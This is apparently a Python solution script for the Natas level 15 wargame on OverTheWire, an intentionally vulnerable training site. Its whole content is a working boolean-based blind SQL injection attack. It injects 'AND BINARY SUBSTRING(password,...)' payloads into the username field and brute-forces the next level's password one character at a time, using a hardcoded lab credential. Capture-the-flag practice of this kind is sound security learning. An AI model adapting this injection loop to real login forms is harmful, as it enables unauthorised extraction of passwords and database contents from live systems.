import requests
import string

url = "http://natas15.natas.labs.overthewire.org/"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

CHAR_SET = string.ascii_letters + string.digits
password = ""

for pos in range(1, 33): 
    for char in CHAR_SET:
        payload = f'natas16" AND BINARY SUBSTRING(password,{pos},1)="{char}"-- a'
        r = requests.post(url, auth=auth, data={"username": payload})
        if "This user exists." in r.text:
            password += char
            print(f"[+] {char} is true charector in {pos} of password")
            break
        else:
            print(f"[-] {char} is not true charector in {pos} of password")
        
print(password)